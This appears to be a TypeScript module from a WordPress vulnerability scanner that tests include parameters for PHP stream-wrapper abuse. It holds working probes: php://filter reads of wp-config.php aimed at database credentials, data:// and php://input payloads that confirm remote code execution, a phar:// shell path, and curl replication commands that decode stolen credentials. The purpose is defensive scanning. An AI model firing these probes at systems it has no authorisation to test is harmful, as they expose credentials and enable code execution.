import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'PHP Wrapper Abuse';

const WRAPPER_PARAMS = ['file', 'path', 'page', 'load', 'template', 'inc', 'view'];

const PHP_CONFIG_WRAPPERS = [
  'php://filter/convert.base64-encode/resource=wp-config.php',
  'php://filter/convert.base64-encode/resource=../wp-config.php',
];

const PHAR_WRAPPER = 'phar:///tmp/evil.phar/shell.php';

// PHP payload to detect RCE; md5('test') = 098f6bcd4621d373cade4e832627b4f6
const PHP_PAYLOAD = `<?php echo 'JWP_RCE_'.md5('test').'_OK'; ?>`;
const PHP_PAYLOAD_B64 = btoa(PHP_PAYLOAD);
const PHP_EXPECTED = 'JWP_RCE_098f6bcd4621d373cade4e832627b4f6_OK';

const CONFIG_KEYWORDS = [
  'DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST',
  'table_prefix', 'AUTH_KEY', 'SECURE_AUTH_KEY',
];

function looksLikeEncodedConfig(text: string): [boolean, string] {
  const chunks = text.match(/[A-Za-z0-9+/]{40,}={0,2}/g) ?? [];
  for (const chunk of chunks) {
    try {
      const decoded = atob(chunk);
      if (CONFIG_KEYWORDS.some(kw => decoded.includes(kw))) {
        return [true, decoded.slice(0, 200)];
      }
    } catch {
      // invalid base64 — skip
    }
  }
  return [false, ''];
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  try {
    await parallelProbe(WRAPPER_PARAMS, async (param) => {
      // Test 1: php://filter base64 on wp-config.php
      await parallelProbe(PHP_CONFIG_WRAPPERS, async (wrapper) => {
        const testUrl = `${target}/?${param}=${encodeURIComponent(wrapper)}`;
        const res = await fetchURL(testUrl);
        if (res && res.status === 200) {
          const body = await res.text();
          if (body.length > 50) {
            const [found, decodedPreview] = looksLikeEncodedConfig(body);
            if (found) {
              findings.push(finding(
                'php_wrapper_abuse', 'CRITICAL', testUrl,
                `PHP filter wrapper via ?${param}= returns base64-encoded content matching wp-config.php keywords. Database credentials may be exposed.`,
                {
                  replication_steps: [
                    `curl -s "${testUrl}" | base64 -d | grep -E "DB_|AUTH_KEY|table_prefix"`,
                    `curl -s "${target}/?${param}=php://filter/convert.base64-encode/resource=wp-config.php" | base64 -d`,
                    '# Decoded content contains WordPress database credentials',
                  ],
                  remediation: 'Validate and sanitize all file include parameters. Never pass user input to include(), require(), or file_get_contents(). Use a whitelist of allowed values.',
                  evidence: `Decoded preview: ${decodedPreview}`,
                },
              ));
            } else if (CONFIG_KEYWORDS.some(kw => body.includes(kw))) {
              findings.push(finding(
                'php_wrapper_abuse', 'CRITICAL', testUrl,
                `?${param}= parameter returns content with wp-config.php keywords in plaintext.`,
                {
                  replication_steps: [
                    `curl -s "${testUrl}" | grep -E "DB_|AUTH_KEY"`,
                  ],
                  remediation: 'Immediately patch the vulnerable include parameter.',
                  evidence: body.slice(0, 200),
                },
              ));
            }
          }
        }
      });

      // Tests 2-4: run concurrently per param
      await Promise.allSettled([
        // Test 2: data:// wrapper with PHP code
        (async () => {
          const dataUrl = `data://text/plain;base64,${PHP_PAYLOAD_B64}`;
          const testUrlData = `${target}/?${param}=${encodeURIComponent(dataUrl)}`;
          const dataRes = await fetchURL(testUrlData, { method: 'POST' });
          if (dataRes && dataRes.status === 200) {
            const body = await dataRes.text();
            if (body.includes(PHP_EXPECTED)) {
              findings.push(finding(
                'php_wrapper_abuse', 'CRITICAL', testUrlData,
                `data:// PHP wrapper via ?${param}= achieved Remote Code Execution. Marker '${PHP_EXPECTED}' found in response.`,
                {
                  replication_steps: [
                    `curl -s "${target}/?${param}=data://text/plain;base64,${PHP_PAYLOAD_B64}"`,
                    '# Response contains RCE marker = code executed on server',
                  ],
                  remediation: 'Disable allow_url_include in php.ini. Never pass user input to include/require functions.',
                  evidence: `RCE marker found: ${PHP_EXPECTED}`,
                },
              ));
            }
          }
        })(),
        // Test 3: php://input with POST body
        (async () => {
          const testUrlInput = `${target}/?${param}=php://input`;
          const inputRes = await fetchURL(testUrlInput, {
            method: 'POST',
            body: PHP_PAYLOAD,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          });
          if (inputRes && inputRes.status === 200) {
            const body = await inputRes.text();
            if (body.includes(PHP_EXPECTED)) {
              findings.push(finding(
                'php_wrapper_abuse', 'CRITICAL', testUrlInput,
                `php://input wrapper via ?${param}= achieved Remote Code Execution. POST body PHP was executed on the server.`,
                {
                  replication_steps: [
                    `curl -s -X POST "${testUrlInput}" --data-raw "${PHP_PAYLOAD}"`,
                    '# If RCE marker in response = code execution confirmed',
                  ],
                  remediation: `Disable allow_url_include. Validate ?${param}= against a whitelist.`,
                  evidence: `RCE marker returned: ${PHP_EXPECTED}`,
                },
              ));
            }
          }
        })(),
        // Test 4: phar:// wrapper
        (async () => {
          const testUrlPhar = `${target}/?${param}=${encodeURIComponent(PHAR_WRAPPER)}`;
          const pharRes = await fetchURL(testUrlPhar);
          if (pharRes && pharRes.status === 200) {
            const body = await pharRes.text();
            if (body.includes(PHP_EXPECTED)) {
              findings.push(finding(
                'php_wrapper_abuse', 'CRITICAL', testUrlPhar,
                `phar:// wrapper via ?${param}= achieved code execution.`,
                {
                  replication_steps: [`curl -s "${testUrlPhar}"`],
                  remediation: 'Disable phar:// stream wrapper; validate file include parameters.',
                  evidence: 'RCE marker in response',
                },
              ));
            }
          }
        })(),
      ]);
    });
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
